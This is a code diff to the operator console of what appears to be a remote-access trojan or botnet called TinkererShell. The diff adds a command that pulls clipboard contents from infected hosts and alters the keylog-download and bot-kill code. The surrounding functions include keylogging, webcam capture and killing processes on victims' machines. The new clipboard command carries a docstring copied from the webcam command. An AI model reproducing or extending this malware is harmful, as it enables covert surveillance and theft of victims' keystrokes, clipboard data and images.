@@ -258,6 +258,12 @@ def webcam_pic() -> bool:
     return True
 
 
+def clip_copy():
+    """Download clipboard content from bot.\n"""
+    sender('SHclipboard')
+    receiver(printer=True)
+
+
 def processkiller():
     """Kill a process.\n"""
     sender('SHprocesskill')
@@ -281,7 +287,7 @@ def keylogdownloader():
     sender('SHkeylogdownload')
     keylogged_data = receiver()
     local_filename = 'keylogged-{}-{}.txt'.format(connected_sockets[active_bot]['ip'],
-                                                      connected_sockets[active_bot]['username'])
+                                                  connected_sockets[active_bot]['username'])
     if keylogged_data == 'reachedexcept':
         receiver(printer=True)
     else:
@@ -338,8 +344,8 @@ def quit_utility() -> bool:
     global conn
     global thr_exit
     double_check = ask_input(phrase='Are you sure? yes/no\n')
-    kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
     if double_check == 'yes':
+        kill_all = ask_input(phrase='Do you want to kill all the bots? yes/no\n')
         for bot in connected_sockets:
             if bot['status'] is True:
                 conn = bot['conn']
@@ -526,6 +532,12 @@ class TinkererShellInput(cmd.Cmd):
     def do_SHwebcampic(self, option):
         """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
         webcam_pic()
+
+    # ---------------------------------------------------------------------------------------------
+    # noinspection PyUnusedLocal
+    def do_SHclipboard(self, option):
+        """SHwebcampic\n\tGrab a picture using the webcam of the remote host\n"""
+        clip_copy()
 
     # ---------------------------------------------------------------------------------------------
     # noinspection PyUnusedLocal
